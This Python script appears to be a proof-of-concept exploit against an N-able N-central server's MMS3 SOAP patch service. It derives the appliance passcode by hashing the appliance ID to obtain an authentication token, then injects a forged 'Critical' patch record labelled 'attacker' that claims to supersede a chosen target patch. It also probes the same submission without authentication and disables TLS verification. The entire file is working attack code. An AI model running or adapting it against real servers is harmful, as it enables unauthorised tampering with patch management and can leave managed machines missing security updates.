#!/usr/bin/env python3
import argparse
import base64
import hashlib
import html
import json
import os
import re
import uuid

import requests
import urllib3


NS = "http://mms3.nobj.nable.com/"


class MMS3:
    def __init__(self, target, proxy, appliance_id, hardware_id):
        self.url = target.rstrip("/") + "/dms2/services2/ServerMMS3"
        self.appliance_id = appliance_id
        self.hardware_id = hardware_id
        self.http = requests.Session()
        self.http.verify = False
        if proxy:
            self.http.proxies.update({"http": proxy, "https": proxy})
        self.token = ""
        self.session_id = ""

    def post(self, operation, body, auth=False, session=False):
        envelope = (
            '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
            f'xmlns:m="{NS}"><soap:Body><m:{operation}>{body}</m:{operation}>'
            '</soap:Body></soap:Envelope>'
        )
        headers = {"Content-Type": "application/soap+xml; charset=UTF-8"}
        if auth:
            headers["Authorization"] = "Bearer " + self.token
        if session:
            headers["X-Session-Id"] = self.session_id
        return self.http.post(self.url, data=envelope.encode(), headers=headers, timeout=60)

    @staticmethod
    def return_value(response):
        match = re.search(r"<(?:\w+:)?return>([^<]+)</(?:\w+:)?return>", response.text)
        if not match:
            raise RuntimeError("SOAP response has no return value")
        return html.unescape(match.group(1))

    def acquire(self):
        passcode = hashlib.sha256(str(self.appliance_id).encode()).hexdigest()
        response = self.post(
            "AcquireToken",
            f"<m:applianceId>{self.appliance_id}</m:applianceId>"
            f"<m:passcode>{passcode}</m:passcode>"
            f"<m:hardwareId>{html.escape(self.hardware_id)}</m:hardwareId>",
        )
        response.raise_for_status()
        self.token = self.return_value(response)
        payload = json.loads(base64.urlsafe_b64decode(self.token.split(".")[1] + "==="))
        self.post("ConfirmTokenReceived", f'<m:jwtId>{payload["jti"]}</m:jwtId>').raise_for_status()
        response = self.post(
            "SessionHello",
            "<m:version>2.0.0</m:version><m:applianceVersion>1.0.0.0</m:applianceVersion>"
            "<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>"
            "<m:timeZoneID>-05:00</m:timeZoneID>",
            auth=True,
        )
        response.raise_for_status()
        self.session_id = self.return_value(response)

    @staticmethod
    def table_row(fields):
        return "".join(
            f"<m:DataArray><m:Key>{html.escape(key)}</m:Key>"
            f"<m:Value>{html.escape(str(value))}</m:Value></m:DataArray>"
            for key, value in fields
        )

    def submit_patch(self, fields, authenticated=True):
        return self.post(
            "PatchSubmitTableData",
            "<m:tableName>patch</m:tableName><m:tableData>" + self.table_row(fields) + "</m:tableData>",
            auth=authenticated,
            session=authenticated,
        )

    def quit(self):
        if self.session_id:
            try:
                self.post("SessionQuit", "<m:shutdown>false</m:shutdown>", auth=True, session=True)
            except requests.RequestException:
                pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://n-central.local")
    parser.add_argument("--proxy", default=os.getenv("HTTPS_PROXY") or os.getenv("HTTP_PROXY"))
    parser.add_argument("--appliance-id", type=int, required=True)
    parser.add_argument("--target-patch-guid", required=True)
    parser.add_argument("--attacker-patch-guid", default=str(uuid.uuid4()))
    parser.add_argument("--kb", default="KB" + str(uuid.uuid4().int % 100000000))
    parser.add_argument("--hardware-id", default="patch-" + uuid.uuid4().hex)
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    client = MMS3(args.target, args.proxy, args.appliance_id, args.hardware_id)
    fields = [
        ("patchguid", args.attacker_patch_guid),
        ("kbnumbers", args.kb),
        ("title", "Security update"),
        ("description", "Security update"),
        ("products", "products"),
        ("infourls", "https://example.invalid/information"),
        ("publisheddate", "2026-11-11"),
        ("classification", "871a0782-be12-a5c4-c57f-1bd6d9f7144e"),
        ("severity", "Critical"),
        ("uninstallsupported", "false"),
        ("eula", ""),
        ("removable", "false"),
        ("restartbehavior", "Never Reboots"),
        ("mayrequestuserinput", "false"),
        ("mustbeinstalledexclusively", "false"),
        ("updatessupersededbythisupdate", args.target_patch_guid),
        ("updatessupersedingthisupdate", ""),
        ("languagessupported", "en-US"),
    ]
    try:
        control = client.submit_patch(fields, authenticated=False)
        print(f"unauthenticated_control={control.status_code}")
        client.acquire()
        result = client.submit_patch(fields)
        print(f"authenticated_submit={result.status_code}")
        print(f"attacker_patch_guid={args.attacker_patch_guid}")
        print(f"target_patch_guid={args.target_patch_guid}")
        print(f"hardware_id={args.hardware_id}")
    finally:
        client.quit()


if __name__ == "__main__":
    main()
